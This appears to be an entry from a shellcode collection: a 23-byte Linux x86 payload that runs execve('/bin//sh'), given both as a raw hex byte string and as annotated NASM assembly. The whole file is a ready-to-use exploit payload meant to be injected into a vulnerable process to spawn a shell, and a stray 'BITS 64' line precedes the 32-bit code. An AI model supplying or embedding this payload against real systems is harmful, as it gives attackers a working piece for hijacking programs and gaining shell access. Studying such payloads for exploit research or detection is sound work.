; Title:    Linux x86 execve /bin/sh
; Platform: linux
; Arch:     x86
; Size:     23 bytes
; Encoding: raw
;
; Assembled hex:
; \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

BITS 64
global _start

_start:
    ; execve("/bin//sh", ["/bin//sh"], NULL)
    BITS    32
    xor     eax, eax
    push    eax                 ; null terminator
    push    0x68732f2f          ; "//sh"
    push    0x6e69622f          ; "/bin"
    mov     ebx, esp            ; ebx = "/bin//sh"
    push    eax
    push    ebx
    mov     ecx, esp            ; argv = ["/bin//sh", NULL]
    mov     al, 11              ; execve
    int     0x80
